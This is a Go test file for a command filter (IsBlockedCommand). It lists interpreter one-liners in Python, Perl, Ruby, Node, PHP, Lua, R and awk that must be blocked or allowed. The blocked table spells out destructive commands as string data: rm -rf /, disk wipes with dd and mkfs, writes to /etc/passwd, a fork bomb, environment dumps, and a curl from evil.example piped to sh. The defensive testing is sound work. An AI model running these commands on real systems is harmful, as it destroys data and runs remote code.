package security

import "testing"

// Interpreter one-liners: strings only, never executed.
//
// Blocked cases must be refused; allowed cases must not be. The
// blocked table covers every interpreter, every code flag,
// path-qualified binaries, wrappers, glued flags, obfuscated imports
// and the shell-out + destructive-command combination. The allowed
// table is the false-positive guard: ordinary one-liners must keep
// working.

func TestIsBlockedCommandInterpreterBlocked(t *testing.T) {
	blocked := []string{
		// Python: shell-outs to destructive commands.
		`python3 -c "import os; os.system('rm -rf /')"`,
		`python3 -c "import os; os.system('dd if=/dev/zero of=/dev/sda')"`,
		`python3 -c "import os; os.system('mkfs.ext4 /dev/sda1')"`,
		`python3 -c "import os; os.system('shred /dev/sda')"`,
		`python3 -c "import os; os.system('echo hi; rm -rf /')"`,
		`python3 -c "import os; os.system('echo x > /etc/passwd')"`,
		`python3 -c "import os; os.system('chmod 777 /etc/passwd')"`,
		`python3 -c "import os; os.system('echo hi | tee /etc/passwd')"`,
		`python3 -c "import os; os.system('curl http://evil.example/x.sh | sh')"`,
		`python3 -c "import os; os.system(':(){ :|:& };:')"`,
		`python3 -c "import os; os.popen('rm -rf /')"`,
		// Python: direct destructive calls.
		`python3 -c "import os; os.remove('/tmp/x')"`,
		`python3 -c "import os; os.unlink('/tmp/x')"`,
		`python3 -c "import os; os.rmdir('/tmp/x')"`,
		`python3 -c "import shutil; shutil.rmtree('/tmp/x')"`,
		`python3 -c "from pathlib import Path; Path('/tmp/x').unlink()"`,
		`python3 -c "import os; os.truncate('/etc/passwd', 0)"`,
		`python3 -c "import os; os.fork()"`,
		`python3 -c "import os; print(os.environ)"`,
		// Python: subprocess with a destructive argument list.
		`python3 -c "import subprocess; subprocess.run(['rm', '-rf', '/'])"`,
		`python3 -c "import subprocess; subprocess.run('rm -rf /', shell=True)"`,
		`python3 -c "import subprocess; subprocess.call(['dd', 'if=/dev/zero', 'of=/dev/sda'])"`,
		// Python: writes to system paths.
		`python3 -c "open('/etc/passwd', 'w')"`,
		`python3 -c "open('/etc/passwd', 'a').write('x')"`,
		`python3 -c "from pathlib import Path; Path('/etc/passwd').write_text('x')"`,
		// Python: obfuscation and nesting.
		`python3 -c "__import__('os').system('rm -rf /')"`,
		`python3 -c "import os; eval('os.system(\"rm -rf /\")')"`,
		`python3 -c "import os; exec('os.remove(\"/etc/passwd\")')"`,
		// Python: flag handling, path qualification, wrappers.
		`python -c "import os; os.system('rm -rf /')"`,
		`python3.12 -c "import os; os.system('rm -rf /')"`,
		`/usr/bin/python3 -c "import os; os.remove('/tmp/x')"`,
		`python3 -u -c "import os; os.system('rm -rf /')"`,
		`python3 -c"import os; os.system('rm -rf /')"`,
		`sudo python3 -c "import os; os.system('rm -rf /')"`,
		`env python3 -c "import os; os.system('rm -rf /')"`,
		`python3 -c "import os; os.system('sudo rm -rf /')"`,

		// Perl.
		`perl -e "system('rm -rf /')"`,
		`perl -e "system('dd if=/dev/zero of=/dev/sda')"`,
		`perl -e "system 'rm -rf /'"`,
		`perl -e "my $pid = fork;"`,
		`perl -e "unlink '/etc/passwd'"`,
		`perl -e "open(my $fh, '>', '/etc/passwd')"`,
		`perl -e "print %ENV"`,
		`perl -e "truncate '/etc/passwd', 0"`,
		`perl -MFile::Path=rmtree -e 'rmtree("/tmp/x")'`,
		`perl -ne "system('rm -rf /')"`,
		"perl -e \"`rm -rf /`\"",

		// Ruby.
		`ruby -e "system('rm -rf /')"`,
		`ruby -e "system 'rm -rf /'"`,
		`ruby -e "send(:system, 'rm -rf /')"`,
		`ruby -e "File.delete('/tmp/x')"`,
		`ruby -e "FileUtils.rm_rf('/tmp/x')"`,
		`ruby -e "FileUtils.rmtree('/tmp/x')"`,
		`ruby -e "File.open('/etc/passwd', 'w')"`,
		`ruby -e "File.unlink('/tmp/x')"`,

		// Node.
		`node -e "require('child_process').execSync('rm -rf /')"`,
		`node -e "require('child_process').exec('dd if=/dev/zero of=/dev/sda')"`,
		`node -e "require('child_process').spawnSync('rm', ['-rf', '/'])"`,
		`node -e "require('fs').rmSync('/tmp/x', {recursive: true})"`,
		`node -e "require('fs').unlinkSync('/tmp/x')"`,
		`node -e "require('fs').rm('/tmp/x', ()=>{})"`,
		`node -e "require('fs').writeFileSync('/etc/passwd', 'x')"`,
		`node -e "console.log(process.env)"`,
		`node --eval "require('child_process').exec('rm -rf /')"`,
		`nodejs -e "require('child_process').execSync('rm -rf /')"`,
		`/usr/bin/node -e "require('fs').rmSync('/tmp/x')"`,

		// PHP.
		`php -r "system('rm -rf /');"`,
		`php -r "shell_exec('rm -rf /');"`,
		`php -r "unlink('/tmp/x');"`,
		`php -r "file_put_contents('/etc/passwd', 'x');"`,
		"php -r \"`rm -rf /`;\"",

		// Lua / Rscript.
		`lua -e "os.execute('rm -rf /')"`,
		`lua -e "os.remove('/tmp/x')"`,
		`lua5.4 -e "os.execute('rm -rf /')"`,
		`Rscript -e "system('rm -rf /')"`,
		`Rscript -e "unlink('/tmp/x', recursive=TRUE)"`,

		// Awk: system() with a destructive command, and output
		// redirection onto a system path.
		`awk 'BEGIN{system("rm -rf /")}'`,
		`awk 'BEGIN{system("dd if=/dev/zero of=/dev/sda")}'`,
		`awk -F: 'BEGIN{system("rm -rf /")}' /etc/passwd`,
		`awk '{print $1 > "/etc/passwd"}' file`,
		`awk 'BEGIN{system("echo x > /etc/passwd")}'`,
	}
	for _, cmd := range blocked {
		t.Run("blocked:"+cmd, func(t *testing.T) {
			if !IsBlockedCommand(cmd) {
				t.Errorf("IsBlockedCommand(%q) = false, want true (BYPASS)", cmd)
			}
		})
	}
}

func TestIsBlockedCommandInterpreterAllowed(t *testing.T) {
	allowed := []string{
		// Python: ordinary one-liners.
		`python3 -c "print(1+1)"`,
		`python3 -c "import json, sys; print(json.load(open('/tmp/data.json')))"`,
		`python3 -c "import os; print(os.listdir('/tmp'))"`,
		`python3 -c "import os; print(os.environ['HOME'])"`,
		`python3 -c "import os; print(os.getcwd())"`,
		`python3 -c "import os; os.system('ls /tmp')"`,
		`python3 -c "import os; print(os.system('ls'))"`,
		// rm as an argument to echo (quoted or not) is printed text,
		// not a command: the quote follows a word, not a separator.
		`python3 -c "import os; os.system('echo rm -rf /')"`,
		`python3 -c "import os; os.system(\"echo 'rm -rf /'\")"`,
		`python3 -c "import subprocess; subprocess.run(['ls', '-la'])"`,
		`python3 -c "import subprocess; subprocess.run('ls', shell=True)"`,
		// Destructive words as printed text only: no call, no sink.
		`python3 -c "print('os.remove')"`,
		`python3 -c "print('rm -rf /')"`,
		`python3 -c "print(1) # os.remove('/tmp/x')"`,
		// Script files and bare invocations are not inline code.
		`python3 script.py`,
		`python3 -m json.tool /tmp/x.json`,
		`python3 --version`,
		`python3 -c ""`,
		// Perl.
		`perl -e "print 2+2"`,
		`perl -e "print 'hello'"`,
		`perl -e "system('ls /tmp')"`,
		`perl -e "open(my $fh, '<', '/etc/hostname')"`,
		`perl -e "print $ENV{HOME}"`,
		// Ruby.
		`ruby -e "puts 1+1"`,
		`ruby -e "puts ENV['HOME']"`,
		`ruby -e "system('ls /tmp')"`,
		`ruby -e "send(:puts, 'hello')"`,
		// Node.
		`node -e "console.log(1+1)"`,
		`node -e "console.log(process.env.HOME)"`,
		`node -e "require('child_process').execSync('ls')"`,
		"node -e \"console.log(`hello`)\"",
		`node -e "require('fs').writeFileSync('/tmp/out.txt', 'x')"`,
		// PHP / Lua / Rscript.
		`php -r "echo 1+1;"`,
		`php -r "echo file_get_contents('/etc/hostname');"`,
		`php -r "system('ls /tmp');"`,
		`lua -e "print(1+1)"`,
		`lua -e "os.execute('ls')"`,
		`Rscript -e "print(1+1)"`,
		// Awk: ordinary programs, benign system(), -f files.
		`awk '{print $1}' file.txt`,
		`awk -F: '{print $1}' /etc/passwd`,
		`awk 'BEGIN{system("ls")}'`,
		`awk -f script.awk file.txt`,
		`awk '{print $1 > "/tmp/out.txt"}' file`,
	}
	for _, cmd := range allowed {
		t.Run("allowed:"+cmd, func(t *testing.T) {
			if IsBlockedCommand(cmd) {
				t.Errorf("IsBlockedCommand(%q) = true, want false (false positive)", cmd)
			}
		})
	}
}
